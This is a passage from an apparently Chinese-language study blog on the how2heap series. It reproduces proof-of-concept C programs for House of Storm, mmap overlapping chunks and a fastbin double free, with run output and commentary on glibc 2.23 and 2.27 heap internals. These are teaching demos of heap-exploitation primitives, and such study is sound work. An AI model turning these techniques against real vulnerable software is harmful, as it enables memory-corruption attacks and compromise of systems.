larger chunk size. So, careful heap feng shui </span></span><br><span class="line"><span class="comment">	must be done.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The address that we want to write to!</span></span><br><span class="line">	fake_chunk = target - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\n This is our target location to get from the allocator"</span>); </span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The address of our fake chunk is set to the unsorted bin </span></span><br><span class="line"><span class="comment">	chunks 'bk' pointer. </span></span><br><span class="line"><span class="comment">	This launches the 'unsorted_bin' attack but it is NOT the</span></span><br><span class="line"><span class="comment">	main purpose of us doing this.</span></span><br><span class="line"><span class="comment">	After launching the 'unsorted_bin attack' the 'victim' pointer</span></span><br><span class="line"><span class="comment">	will be set to THIS address. Our goal is to find a way to get</span></span><br><span class="line"><span class="comment">	this address from the allocator.</span></span><br><span class="line"><span class="comment">	Vulnerability!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Only needs to be a valid address. </span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;fd</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"of your fake chunk."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Misalign the location in order to use the primitive as a SIZE value."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"The 'offset' changes depending on if the binary is PIE (5) or not PIE (2)."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Vulnerability #2!"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at."</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	This can be seen as a WRITE-WHERE primitive in the large bin.</span></span><br><span class="line"><span class="comment">	However, we are going to write a 'size' for our fake chunk using this. </span></span><br><span class="line"><span class="comment">	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579</span></span><br><span class="line"><span class="comment">	to an address for our fake size. The write above (bk_nextsize) is</span></span><br><span class="line"><span class="comment">	controlled via the pointer we are going to overwrite below. The</span></span><br><span class="line"><span class="comment">	value that gets written is a heap address; the unsorted bin </span></span><br><span class="line"><span class="comment">	chunk address above. </span></span><br><span class="line"><span class="comment">	The 'key' to this is the offset. First, we subtract 0x18 because</span></span><br><span class="line"><span class="comment">	this is the offset to writting to fd_nextsize in the code shown </span></span><br><span class="line"><span class="comment">	above. Secondly, notice the -2 below. We are going</span></span><br><span class="line"><span class="comment">	to write a 'heap address' at a mis-aligned location and</span></span><br><span class="line"><span class="comment">	use THIS as the size. For instance, if the heap address is 0x123456</span></span><br><span class="line"><span class="comment">	and the pointer is set to 0x60006. This will write the following way:</span></span><br><span class="line"><span class="comment">	- 0x60006: 0x56</span></span><br><span class="line"><span class="comment">	- 0x60007: 0x34</span></span><br><span class="line"><span class="comment">	- 0x60008: 0x12</span></span><br><span class="line"><span class="comment">	Now, our 'fake size' is at 0x60008 and is a valid size for the </span></span><br><span class="line"><span class="comment">	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk</span></span><br><span class="line"><span class="comment">	from the allocator. </span></span><br><span class="line"><span class="comment">	Second vulnerability!!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, we've corrupted everything in just the right </span></span><br><span class="line"><span class="comment">	way so this should work. </span></span><br><span class="line"><span class="comment">	The purpose of the attack is to have a corrupted 'bk' pointer</span></span><br><span class="line"><span class="comment">	point to ANYWHERE we want and still get the memory back. We do</span></span><br><span class="line"><span class="comment">	this by using the large bin code to write a size to the 'bk' </span></span><br><span class="line"><span class="comment">	location.</span></span><br><span class="line"><span class="comment">	This call to malloc (if you're lucky), will return a pointer</span></span><br><span class="line"><span class="comment">	to the fake chunk that we created above. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Make allocation of the size that the value will be written for."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Once the allocation happens, the madness begins"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Once in the unsorted bin, the 'large bin' chunk will be used in orer to "</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"write a fake 'size' value to the location of our target."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"After this, the target will have a valid size."</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid"</span>); </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"size and remove it from the bin."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"With this, we have pulled out an arbitrary chunk!"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"String before: %s\n"</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"String pointer: %p\n"</span>, target);</span><br><span class="line">	</span><br><span class="line">	ptr = <span class="built_in">malloc</span>(alloc_size);</span><br><span class="line">	<span class="built_in">strncpy</span>(ptr, <span class="string">"\x41\x42\x43\x44\x45\x46\x47"</span>, <span class="number">0x58</span> - <span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"String after %s\n"</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk ptr: %p\n"</span>, ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>几乎等于unsorted bin attack + large bin attack。调试的时候关掉aslr和pie，不然的话会失败。即然都说了unsortedbin和large bin，所以先创建unsorted bin大小为0x4e0，检查该chunk的地址最高非0位的值x，判断x是否小于0x10，小于0则失败。注意这里的bin用unsorted bin和large bin来表示就不再用正常的bin和释放之后对应的bin。</p>
<p>然后x的最低4位进行判断，申请一个large bin。然后释放large bin，和unsorted bin其中chunk与chunk之间放入0x18大小的堆，为了防止合并。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/52.png"></p>
<p>申请0x4e8，这个是为了让large bin进入large bin，再申请unsorted bin，并释放掉使得真正变成unsortedbin</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/53.png"></p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/54.png"></p>
<p>改两个bin的bk到target附近，其中large bin的bk_next_size也改掉，最后申请过去就可以看到target已经被控制了。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/55.png"></p>
<p>house_of_storm可能有点meng，结合题目来练习是个不错的选择，运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">House of Storm</span><br><span class="line">======================================</span><br><span class="line">Preparing chunks <span class="keyword">for</span> the exploit</span><br><span class="line">Put one chunk into unsorted bin and the other into the large bin</span><br><span class="line">The unsorted bin chunk MUST be larger than the large bin chunk.</span><br><span class="line">Find the proper chunk size to allocate.</span><br><span class="line">Must be exactly the size of the written chunk from above.</span><br><span class="line">Shift Amount: <span class="number">2</span></span><br><span class="line">In this <span class="keyword">case</span>, the chunk size is <span class="number">0x30</span></span><br><span class="line">Vulnerability! Overwrite unsorted bins <span class="string">'bk'</span> pointer with our target location.</span><br><span class="line"> This is our target location to get from the allocator</span><br><span class="line">Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location</span><br><span class="line">of your fake chunk.</span><br><span class="line">Misalign the location in order to use the primitive as a SIZE value.</span><br><span class="line">The <span class="string">'offset'</span> changes depending on <span class="keyword">if</span> the binary is PIE (<span class="number">5</span>) or not PIE (<span class="number">2</span>).</span><br><span class="line">Vulnerability #<span class="number">2</span>!</span><br><span class="line">Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.</span><br><span class="line">Make allocation of the size that the value will be written <span class="keyword">for</span>.</span><br><span class="line">Once the allocation happens, the madness begins</span><br><span class="line">Once in the unsorted bin, the <span class="string">'large bin'</span> chunk will be used in orer to </span><br><span class="line">write a fake <span class="string">'size'</span> value to the location of our target.</span><br><span class="line">After this, the target will have a valid size.</span><br><span class="line">Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid</span><br><span class="line">size and remove it from the bin.</span><br><span class="line">With this, we have pulled out an arbitrary chunk!</span><br><span class="line">String before: </span><br><span class="line">String pointer: <span class="number">0x4040a0</span></span><br><span class="line">String after ABCDEFG</span><br><span class="line">Fake chunk ptr: <span class="number">0x4040a0</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="mmap-overlapping-chunks（mmap）"><a href="#mmap-overlapping-chunks（mmap）" class="headerlink" title="mmap_overlapping_chunks（mmap）"></a>mmap_overlapping_chunks（mmap）</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Technique should work on all versions of GLibC</span></span><br><span class="line"><span class="comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment">POC written by POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Extremely large chunks are special because they are allocated in their own mmaped section\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"of memory, instead of being put onto the normal heap.\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"=======================================================\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating three extremely large heap chunks of size 0x100000 \n\n"</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The first mmap chunk goes directly above LibC: %p\n"</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The second mmap chunk goes below LibC: %p\n"</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The third mmap chunk goes below the second mmap chunk: %p\n"</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nCurrent System Memory Layout \n"</span> \</span><br><span class="line"><span class="string">"================================================\n"</span> \</span><br><span class="line"><span class="string">"running program\n"</span> \</span><br><span class="line"><span class="string">"heap\n"</span> \</span><br><span class="line"><span class="string">"....\n"</span> \</span><br><span class="line"><span class="string">"third mmap chunk\n"</span> \</span><br><span class="line"><span class="string">"second mmap chunk\n"</span> \</span><br><span class="line"><span class="string">"LibC\n"</span> \</span><br><span class="line"><span class="string">"....\n"</span> \</span><br><span class="line"><span class="string">"ld\n"</span> \</span><br><span class="line"><span class="string">"first mmap chunk\n"</span></span><br><span class="line"><span class="string">"===============================================\n\n"</span> \</span><br><span class="line">);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Prev Size of third mmap chunk: 0x%llx\n"</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Size of third mmap chunk: 0x%llx\n\n"</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Change the size of the third mmap chunk to overlap with the second mmap chunk\n"</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This will cause both chunks to be Munmapped and given back to the system\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New size of third mmap chunk: 0x%llx\n"</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Free the third mmap chunk, which munmaps the second and third chunks\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Get a very large chunk from malloc to get mmapped chunk\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This should overlap over the previously munmapped/freed chunks\n"</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk Ptr: %p\n"</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk Ptr Size: 0x%llx\n"</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n"</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Value of index 0 of mmap chunk 2 prior to write: %llx\n"</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Setting the value of the overlapped chunk\n"</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Second chunk value (after write): 0x%llx\n"</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Overlapped chunk value: 0x%llx\n\n"</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Boom! The new chunk has been overlapped with a previous mmaped chunk\n"</span>);</span><br><span class="line">	assert(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>注释太长了，这里删除了一些注释。此利用手法是针对于mmap申请的的堆块</p>
<p>创建了一个0x10的堆块，接下来连续创建了三个0x100000大小的堆块，由mmap分配，释放的话由munmap来释放</p>
<p>此时的地址如下，第一个块在libc上方，第二个块在libc下方第三个块低于第二个块。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The first mmap chunk goes directly above LibC: 0x7ffff7ef2010</span><br><span class="line">The second mmap chunk goes below LibC: 0x7ffff790c010</span><br><span class="line">The third mmap chunk goes below the second mmap chunk: 0x7ffff780b010</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/56.png"></p>
<p>现在假设有一个漏洞可以改mmap3的size，使得mmap3的size包含了mmap2，并释放mmap3，再申请一个大块，此时mmap3 + mmap2是一个块，但是mmap2又是一个独立的块，原理和前面的overlapping一样。再写入值就可以看到mmap2那里被覆盖了。</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).</span><br><span class="line">Extremely large chunks are special because they are allocated in their own mmaped section</span><br><span class="line">of memory, instead of being put onto the normal heap.</span><br><span class="line">=======================================================</span><br><span class="line"></span><br><span class="line">Allocating three extremely large heap chunks of size 0x100000 </span><br><span class="line"></span><br><span class="line">The first mmap chunk goes directly above LibC: 0x7f34ffb39010</span><br><span class="line">The second mmap chunk goes below LibC: 0x7f34ff54d010</span><br><span class="line">The third mmap chunk goes below the second mmap chunk: 0x7f34ff44c010</span><br><span class="line"></span><br><span class="line">Current System Memory Layout </span><br><span class="line">================================================</span><br><span class="line">running program</span><br><span class="line">heap</span><br><span class="line">....</span><br><span class="line">third mmap chunk</span><br><span class="line">second mmap chunk</span><br><span class="line">LibC</span><br><span class="line">....</span><br><span class="line">ld</span><br><span class="line">first mmap chunk</span><br><span class="line">===============================================</span><br><span class="line"></span><br><span class="line">Prev Size of third mmap chunk: 0x0</span><br><span class="line">Size of third mmap chunk: 0x101002</span><br><span class="line"></span><br><span class="line">Change the size of the third mmap chunk to overlap with the second mmap chunk</span><br><span class="line">This will cause both chunks to be Munmapped and given back to the system</span><br><span class="line">This is where the vulnerability occurs; corrupting the size or prev_size of a chunk</span><br><span class="line">New size of third mmap chunk: 0x202002</span><br><span class="line">Free the third mmap chunk, which munmaps the second and third chunks</span><br><span class="line"></span><br><span class="line">Get a very large chunk from malloc to get mmapped chunk</span><br><span class="line">This should overlap over the previously munmapped/freed chunks</span><br><span class="line">Overlapped chunk Ptr: 0x7f34ff34d010</span><br><span class="line">Overlapped chunk Ptr Size: 0x301002</span><br><span class="line">Distance between new chunk and the second mmap chunk (which was munmapped): 0x40000</span><br><span class="line">Value of index 0 of mmap chunk 2 prior to write: 0</span><br><span class="line">Setting the value of the overlapped chunk</span><br><span class="line">Second chunk value (after write): 0x1122334455667788</span><br><span class="line">Overlapped chunk value: 0x1122334455667788</span><br><span class="line"></span><br><span class="line">Boom! The new chunk has been overlapped with a previous mmaped chunk</span><br></pre></td></tr></tbody></table></figure>

<p><code>至此glibc2.23下的利用方式完，以后可能会进行更新</code></p>
<h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h2><blockquote>
<p>2.27和2.23最大的区别就是引入了一个tcache，但是为了追求性能的同时也少了很多的检测， 笔者认为2.27下的漏洞利用相对于2.23和2.27以上的是最方便的</p>
</blockquote>
<h3 id="fastbin-dup-double-free-1"><a href="#fastbin-dup-double-free-1" class="headerlink" title="fastbin_dup(double free)"></a>fastbin_dup(double free)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fill up tcache first.\n"</span>);</span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) {</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st calloc(1, 8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd calloc(1, 8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd calloc(1, 8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st calloc(1, 8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd calloc(1, 8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd calloc(1, 8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

